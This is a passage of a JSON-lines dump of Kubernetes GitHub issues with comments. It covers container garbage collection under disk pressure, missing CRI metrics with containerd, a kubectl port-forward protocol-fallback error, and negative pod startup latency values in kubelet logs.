[`minimum-container-ttl-duration`](https://github.com/kubernetes/kubernetes/blob/master/cmd/kubelet/app/options/options.go#L313C44-L313C74).\n> \n> Can you check if you're using that?\n\nI didn't use `minimum-container-ttl-duration`.\n\nMy understanding is:\n1. Without `minimum-container-ttl-duration`, all containers that are not running are regarded as evictable no matter when they are created because `minAge` is `0`:\n   https://github.com/kubernetes/kubernetes/blob/2d0a4f75560154454682b193b42813159b20f284/pkg/kubelet/kuberuntime/kuberuntime_gc.go#L197-L207\n2. Then, containers in terminated pods are deleted because `evictNonDeletedPods` is `true`:\n  https://github.com/kubernetes/kubernetes/blob/2d0a4f75560154454682b193b42813159b20f284/pkg/kubelet/kuberuntime/kuberuntime_gc.go#L237-L238\n"}, {"author": "KevinTMtz", "body": "I verified the behavior mentioned by @hshiina, and effectively the `DeleteAllUnusedContainers` and `DeleteUnusedImages` are already cleaning up the containers belonging to terminated pods.\n\nI tried multiple times, and found that the behavior was consistent when the corresponding image to be deleted was older than the default `minAge` required for an image to be eligible for cleanup. I used the following pods:\n\n#### Terminated pod\nThis pod should be marked as `Completed` before executing the Running pod, and its image is big enough (4.67GB) to remove disk pressure when the image is cleaned up.\n```\napiVersion: v1\nkind: Pod\nmetadata:\n  name: android\nspec:\n  restartPolicy: Never\n  containers:\n  - name: android\n    image: cimg/android:2024.11.1-ndk\n    command: [\"sh\", \"-c\", \"sleep 0\"]\n    volumeMounts:\n    - name: tmp-volume\n      mountPath: /tmp\n  volumes:\n  - name: tmp-volume\n    emptyDir: {}\n```\n\n#### Runnning pod\nThis pod writes 10GB of storage, and is expected to continue running even when it causes disk pressure on the node, as the cleaning of the terminated pod frees up enough resources to remove the disk pressure.\n```\napiVersion: v1\nkind: Pod\nmetadata:\n  name: over-limit\nspec:\n  containers:\n  - name: over-limit\n    image: busybox\n    command: [\"sh\", \"-c\", \"dd if=/dev/zero of=/tmp/largefile bs=1M count=10000 && sleep infinity\"]\n    volumeMounts:\n    - name: tmp-volume\n      mountPath: /tmp\n  volumes:\n  - name: tmp-volume\n    emptyDir: {}\n```"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133884, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133884", "issue_title": "The PodAndContainerStatsFromCRI feature doesn\u2019t expose metrics.", "issue_author": "Goend", "issue_body": "### What happened?\n\nHello, I\u2019m a bit confused about the progress of KEP 2371. When I enable this feature, I can no longer get a large number of metrics from the /metrics/cadvisor endpoint. From the /stats/summary endpoint, I\u2019m not sure whether the corresponding metrics are available\u2014it feels more like statistics data rather than metrics. Because of this, I\u2019m a bit puzzled.\n\n1.For the metrics provided through CRI, is there a better way to observe them? Especially regarding whether there are differences before and after the feature is enabled. Shouldn\u2019t there be a dedicated endpoint like /metrics/cri for better observability?\n\n2.Have all the metrics previously emitted by cAdvisor already been fully implemented by CRI\u2014for example, blkio and fs-related metrics?\n\n3.What\u2019s the long-term plan for cAdvisor? Will it eventually be completely deprecated?\n\nFrom the information in [the KEP document](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2371-cri-pod-container-stats/README.md?cri-implementations)\n\"The Alpha release will add support for both /stats/summary endpoint and /metrics/cadvisor endpoint. The release will focus on finalizing and enabling support for the set of metrics from /metrics/cadvisor that CRI implementations must support.\" \n\n\nbut request /metrics/cadvisor :\n```\n[root@node-1 ~]# curl --cacert /etc/kubernetes/ssl/ca.pem  --cert /etc/kubernetes/ssl/admin-node-1.pem  --key /etc/kubernetes/ssl/admin-node-1-key.pem  https://10.20.0.4:10250/metrics/cadvisor\n# HELP machine_cpu_cores Number of logical CPU cores.\n# TYPE machine_cpu_cores gauge\nmachine_cpu_cores{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 8\n# HELP machine_cpu_physical_cores Number of physical CPU cores.\n# TYPE machine_cpu_physical_cores gauge\nmachine_cpu_physical_cores{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 1\n# HELP machine_cpu_sockets Number of CPU sockets.\n# TYPE machine_cpu_sockets gauge\nmachine_cpu_sockets{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 8\n# HELP machine_memory_bytes Amount of memory installed on the machine.\n# TYPE machine_memory_bytes gauge\nmachine_memory_bytes{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 1.5999279104e+10\n# HELP machine_nvm_avg_power_budget_watts NVM power budget.\n# TYPE machine_nvm_avg_power_budget_watts gauge\nmachine_nvm_avg_power_budget_watts{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 0\n# HELP machine_nvm_capacity NVM capacity value labeled by NVM mode (memory mode or app direct mode).\n# TYPE machine_nvm_capacity gauge\nmachine_nvm_capacity{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",mode=\"app_direct_mode\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 0\nmachine_nvm_capacity{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",mode=\"memory_mode\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 0\n# HELP machine_scrape_error 1 if there was an error while getting machine metrics, 0 otherwise.\n# TYPE machine_scrape_error gauge\nmachine_scrape_error 0\n# HELP machine_swap_bytes Amount of swap memory available on the machine.\n# TYPE machine_swap_bytes gauge\nmachine_swap_bytes{boot_id=\"9cbf0679-3e5a-4872-a414-7d085d816d83\",machine_id=\"380970011dca4a40b65e2dfabcd7a3bf\",system_uuid=\"4d6fef83-7d44-433b-b0c8-25998f3a16f7\"} 0\n```\n\nI\u2019m not sure if I missed anything.\ndocs: https://kubernetes.io/docs/reference/instrumentation/cri-pod-container-metrics/\n\n### What did you expect to happen?\n\n/metrics/cadvisor responce with container metrics\n```\ncontainer_blkio_device_usage_total....\ncontainer_fs....\n```\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1.update kubelet use PodAndContainerStatsFromCRI=true\n2. restart kubelet then request https://<ip>:10250/metrics/cadvisor\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n[root@node-1 ~]# kubectl  version\nClient Version: v1.32.2\nKustomize Version: v5.5.0\nServer Version: v1.32.2\n\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n<details>\n\n```\n[root@node-1 ~]# containerd -v\ncontainerd github.com/containerd/containerd 1.7.27 7ae65b08b9577090ac971c04291095ce5c8b024f\n```\n</details>\n\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "kind/support", "sig/node", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@Goend: The label(s) `kind/suuport` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133884#issuecomment-3252248744):\n\n>/kind suuport\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "Goend", "body": "/kind support"}, {"author": "Goend", "body": "/sig node"}, {"author": "Goend", "body": "@haircommander  I would greatly appreciate any suggestions you might have."}, {"author": "haircommander", "body": "containerd doesn't yet have support for metrics, which is why the KEP is still in alpha. you can try CRI-O out if you want to test this feature :) "}, {"author": "Goend", "body": "ref:  https://github.com/containerd/containerd/issues/10506"}, {"author": "Goend", "body": "> containerd doesn't yet have support for metrics, which is why the KEP is still in alpha. you can try CRI-O out if you want to test this feature :)\n\nThank you very much for your advice. :smile:"}, {"author": "haircommander", "body": "Since this is a containerd issue, i think we can close this.\nplease reopen if you disagreee\n/close"}, {"author": "k8s-ci-robot", "body": "@haircommander: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133884#issuecomment-3275931460):\n\n>Since this is a containerd issue, i think we can close this.\n>please reopen if you disagreee\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133913, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133913", "issue_title": "`kubectl port-forward` initially fails with `query parameter \"port\" is required` before succeeding on fallback", "issue_author": "ded-jajmera", "issue_body": "### Description\nWhen running kubectl port-forward, the initial upgrade attempt fails with a `400 Bad Request`:\n```\nHTTP/1.1 400 Bad Request\nContent-Length: 34\nContent-Type: text/plain; charset=utf-8\nDate: Thu, 04 Sep 2025 19:55:42 GMT\nquery parameter \"port\" is required\n```\n\nAfter this failure, kubectl falls back to a secondary dialer and successfully establishes the port-forward tunnel. \n\n### Versioning\nClient Version: v1.34.0 (darwin/arm64)\nKustomize Version: v5.7.1\nServer Version: v1.30.8\nOS: macOS Sequoia 15.6.1\n\n### Steps to Reproduce\nRun `kubectl port-forward` with `--v=8`:\n```\nI0905 15:02:08.184600   19436 tunneling_dialer.go:75] Before WebSocket Upgrade Connection...\nI0905 15:02:08.184634   19436 round_trippers.go:527] \"Request\" verb=\"GET\" url=\"https://<REDACTED>/portforward\" headers=<\n    Sec-Websocket-Protocol: SPDY/3.1+portforward.k8s.io\n    User-Agent: kubectl/v1.34.0 (darwin/arm64) kubernetes/f28b4c9\n>\nI0905 15:02:08.335009   19436 round_trippers.go:632] \"Response\" status=\"\" headers=\"\" milliseconds=150\nI0905 15:02:08.335078   19436 fallback_dialer.go:53] fallback to secondary dialer from primary dialer err: unable to upgrade streaming request: websocket: bad handshake (400 Bad Request): query parameter \"port\" is required\nI0905 15:02:08.335156   19436 round_trippers.go:527] \"Request\" verb=\"POST\" url=\"https://<REDACTED>/portforward\" headers=<\n    User-Agent: kubectl/v1.34.0 (darwin/arm64) kubernetes/f28b4c9\n    X-Stream-Protocol-Version: portforward.k8s.io\n>\nI0905 15:02:08.511107   19436 round_trippers.go:632] \"Response\" status=\"101 Switching Protocols\" headers=<\n    Connection: Upgrade\n    Date: Fri, 05 Sep 2025 19:02:08 GMT\n    Upgrade: SPDY/3.1\n    X-Stream-Protocol-Version: portforward.k8s.io\n> milliseconds=175\nForwarding from 127.0.0.1:7000 -> 80\nForwarding from [::1]:7000 -> 80\n```\n\nAs you can see in the logs above, the POST request does not include any query parameters.\n\n### Expected Behavior\n`kubectl port-forward` should negotiate the correct upgrade protocol without an initial 400 error.\n\n### Expected Fix\n`kubectl port-forward` should send the port information as a query parameter OR the error check should be updated.", "issue_labels": ["kind/bug", "sig/api-machinery", "sig/cli", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ded-jajmera", "body": "/kind bug"}, {"author": "k8s-ci-robot", "body": "@ded-jajmera: The label(s) `kind//sig, kind/cli, kind//sig, kind/api-machinery` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133913#issuecomment-3259459455):\n\n>/kind bug /sig cli /sig api-machinery\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ded-jajmera", "body": "/sig cli\n/sig api-machinery"}, {"author": "aojea", "body": "> Server Version: v1.30.8\n\n\nportforward is enabled by default in 1.31 https://github.com/kubernetes/enhancements/tree/master/keps/sig-api-machinery/4006-transition-spdy-to-websockets so the server \"does not understand\" the client and falls back"}, {"author": "itzPranshul", "body": "It might be my lack of understanding, but kubectl v1.31+ uses webSocket by default for streaming and SPDY on fallback and server 1.30 only supports the SPDY protocol for streaming, so you see the error when trying to use webSocket initially and succeeds with the SPDY. \n\nPossible fix - we can update kubectl logic to detect older API servers and skip WebSocket attempt, going straight to SPDY.This avoids the initial failed request and extra latency."}, {"author": "aojea", "body": "this is working as intended, the error is harmless, in case the error message worries you can switch  kubectl to use the same version as the server "}, {"author": "ded-jajmera", "body": "Sure, that makes sense, thanks @aojea @itzPranshul. I like @itzPranshul's suggestion of skipping the initial WebSocket attempt with older API servers"}, {"author": "aojea", "body": "> Sure, that makes sense, thanks [@aojea](https://github.com/aojea) [@itzPranshul](https://github.com/itzPranshul). I like [@itzPranshul](https://github.com/itzPranshul)'s suggestion of skipping the initial WebSocket attempt with older API servers\n\n1.30 is EOL https://kubernetes.io/releases/ "}, {"author": "mpuckett159", "body": "/close\nworking as expected"}, {"author": "k8s-ci-robot", "body": "@mpuckett159: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133913#issuecomment-3275761642):\n\n>/close\n>working as expected\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 130432, "issue_url": "https://github.com/kubernetes/kubernetes/issues/130432", "issue_title": "pod_startup_latency_tracker : podStartSLOduration returns negative value with serializeImagePulls set to false", "issue_author": "alyssa1303", "issue_body": "### What happened?\n\nThis can be observed easily when deployed a large number of pods (i.e. 20 pods) at the same time in Kubernetes version 1.31. I found an issue with similar symptom, but it's supposed to be resolved on version 1.27\n```\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.323529    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-c74hl\" podStartSLOduration=1.344002188 podStartE2EDuration=\"3.323519624s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.734807377 +0000 UTC m=+565.347657070\" lastFinishedPulling=\"2025-02-25 21:38:55.714324713 +0000 UTC m=+567.327174506\" observedRunningTime=\"2025-02-25 21:38:56.323492624 +0000 UTC m=+567.936342317\" watchObservedRunningTime=\"2025-02-25 21:38:56.323519624 +0000 UTC m=+567.936369517\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.338810    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-bd4br\" podStartSLOduration=1.2549581779999999 podStartE2EDuration=\"3.338800195s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.661167137 +0000 UTC m=+565.274016830\" lastFinishedPulling=\"2025-02-25 21:38:55.745009154 +0000 UTC m=+567.357858847\" observedRunningTime=\"2025-02-25 21:38:56.338414293 +0000 UTC m=+567.951264086\" watchObservedRunningTime=\"2025-02-25 21:38:56.338800195 +0000 UTC m=+567.951649988\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.361959    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-5ljwx\" podStartSLOduration=1.360169063 podStartE2EDuration=\"3.361949302s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.709078158 +0000 UTC m=+565.321927851\" lastFinishedPulling=\"2025-02-25 21:38:55.710858397 +0000 UTC m=+567.323708090\" observedRunningTime=\"2025-02-25 21:38:56.353660063 +0000 UTC m=+567.966509756\" watchObservedRunningTime=\"2025-02-25 21:38:56.361949302 +0000 UTC m=+567.974799095\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.369811    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-btpww\" podStartSLOduration=1.305661411 podStartE2EDuration=\"3.369803938s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.681766232 +0000 UTC m=+565.294615925\" lastFinishedPulling=\"2025-02-25 21:38:55.745908759 +0000 UTC m=+567.358758452\" observedRunningTime=\"2025-02-25 21:38:56.369554537 +0000 UTC m=+567.982404230\" watchObservedRunningTime=\"2025-02-25 21:38:56.369803938 +0000 UTC m=+567.982653731\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.387444    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-46lsl\" podStartSLOduration=1.348360709 podStartE2EDuration=\"3.387435419s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.674280998 +0000 UTC m=+565.287130691\" lastFinishedPulling=\"2025-02-25 21:38:55.713355708 +0000 UTC m=+567.326205401\" observedRunningTime=\"2025-02-25 21:38:56.387005517 +0000 UTC m=+567.999855210\" watchObservedRunningTime=\"2025-02-25 21:38:56.387435419 +0000 UTC m=+568.000285112\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.403513    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-jnjrp\" podStartSLOduration=1.3758508360000001 podStartE2EDuration=\"3.403501694s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.719430606 +0000 UTC m=+565.332280399\" lastFinishedPulling=\"2025-02-25 21:38:55.747081464 +0000 UTC m=+567.359931257\" observedRunningTime=\"2025-02-25 21:38:56.403166792 +0000 UTC m=+568.016016485\" watchObservedRunningTime=\"2025-02-25 21:38:56.403501694 +0000 UTC m=+568.016351387\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.419566    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-ccb4x\" podStartSLOduration=1.444765554 podStartE2EDuration=\"3.419556368s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.728079746 +0000 UTC m=+565.340929439\" lastFinishedPulling=\"2025-02-25 21:38:55.70287056 +0000 UTC m=+567.315720253\" observedRunningTime=\"2025-02-25 21:38:56.419161366 +0000 UTC m=+568.032011159\" watchObservedRunningTime=\"2025-02-25 21:38:56.419556368 +0000 UTC m=+568.032406061\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.436171    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-r87rt\" podStartSLOduration=1.4568067089999999 podStartE2EDuration=\"3.436161144s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.730592558 +0000 UTC m=+565.343442251\" lastFinishedPulling=\"2025-02-25 21:38:55.709946993 +0000 UTC m=+567.322796686\" observedRunningTime=\"2025-02-25 21:38:56.435724342 +0000 UTC m=+568.048574035\" watchObservedRunningTime=\"2025-02-25 21:38:56.436161144 +0000 UTC m=+568.049010837\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.451845    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-ddtjq\" podStartSLOduration=1.468768364 podStartE2EDuration=\"3.451837417s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.716675693 +0000 UTC m=+565.329525386\" lastFinishedPulling=\"2025-02-25 21:38:55.699744746 +0000 UTC m=+567.312594439\" observedRunningTime=\"2025-02-25 21:38:56.451532415 +0000 UTC m=+568.064382108\" watchObservedRunningTime=\"2025-02-25 21:38:56.451837417 +0000 UTC m=+568.064687210\"\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.466178    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-dvz9k\" podStartSLOduration=1.349237313 podStartE2EDuration=\"3.466167683s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.600616658 +0000 UTC m=+565.213466351\" lastFinishedPulling=\"2025-02-25 21:38:55.717546928 +0000 UTC m=+567.330396721\" observedRunningTime=\"2025-02-25 21:38:56.466025982 +0000 UTC m=+568.078875675\" watchObservedRunningTime=\"2025-02-25 21:38:56.466167683 +0000 UTC m=+568.079017476\"\nFeb 25 21:39:05 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:05.352953    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-8fdzh\" podStartSLOduration=-9223372024.501835 podStartE2EDuration=\"12.352941551s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.759004789 +0000 UTC m=+565.371854482\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:05.35260405 +0000 UTC m=+576.965453743\" watchObservedRunningTime=\"2025-02-25 21:39:05.352941551 +0000 UTC m=+576.965791244\"\nFeb 25 21:39:07 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:07.357166    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-xjqwh\" podStartSLOduration=-9223372022.497623 podStartE2EDuration=\"14.357152842s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.747887837 +0000 UTC m=+565.360737530\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:07.356718546 +0000 UTC m=+578.969568239\" watchObservedRunningTime=\"2025-02-25 21:39:07.357152842 +0000 UTC m=+578.970002535\"\nFeb 25 21:39:07 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:07.373079    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-txh69\" podStartSLOduration=-9223372022.481707 podStartE2EDuration=\"14.373068399s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.77438226 +0000 UTC m=+565.387231953\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:07.372808301 +0000 UTC m=+578.985657994\" watchObservedRunningTime=\"2025-02-25 21:39:07.373068399 +0000 UTC m=+578.985918092\"\nFeb 25 21:39:07 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:07.392708    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-7nhl7\" podStartSLOduration=-9223372022.462074 podStartE2EDuration=\"14.392701821s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.758577787 +0000 UTC m=+565.371427480\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:07.392238626 +0000 UTC m=+579.005088319\" watchObservedRunningTime=\"2025-02-25 21:39:07.392701821 +0000 UTC m=+579.005551614\"\nFeb 25 21:39:07 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:07.410015    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-t877k\" podStartSLOduration=-9223372022.44477 podStartE2EDuration=\"14.410004765s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.758583587 +0000 UTC m=+565.371433280\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:07.409663668 +0000 UTC m=+579.022513361\" watchObservedRunningTime=\"2025-02-25 21:39:07.410004765 +0000 UTC m=+579.022854458\"\nFeb 25 21:39:08 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:08.365845    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-gb6tb\" podStartSLOduration=-9223372021.488941 podStartE2EDuration=\"15.365835135s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.748261839 +0000 UTC m=+565.361111632\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:08.36525234 +0000 UTC m=+579.978102133\" watchObservedRunningTime=\"2025-02-25 21:39:08.365835135 +0000 UTC m=+579.978684828\"\nFeb 25 21:39:08 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:08.414713    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-6h58c\" podStartSLOduration=-9223372021.440079 podStartE2EDuration=\"15.414697194s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.768832034 +0000 UTC m=+565.381681827\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:08.414602395 +0000 UTC m=+580.027452188\" watchObservedRunningTime=\"2025-02-25 21:39:08.414697194 +0000 UTC m=+580.027546987\"\nFeb 25 21:39:08 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:08.479999    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-8kf54\" podStartSLOduration=-9223372021.374792 podStartE2EDuration=\"15.479984263s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.773336955 +0000 UTC m=+565.386186648\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:08.432632432 +0000 UTC m=+580.045482125\" watchObservedRunningTime=\"2025-02-25 21:39:08.479984263 +0000 UTC m=+580.092834156\"\nFeb 25 21:39:09 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:09.368159    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-2vfzh\" podStartSLOduration=-9223372020.48663 podStartE2EDuration=\"16.368146878s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.740005101 +0000 UTC m=+565.352854894\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 21:39:09.368031478 +0000 UTC m=+580.980881171\" watchObservedRunningTime=\"2025-02-25 21:39:09.368146878 +0000 UTC m=+580.980996571\"\nFeb 25 21:39:09 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:39:09.383023    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-hgd78\" **podStartSLOduration=-9223372020.471764** podStartE2EDuration=\"16.383012397s\" 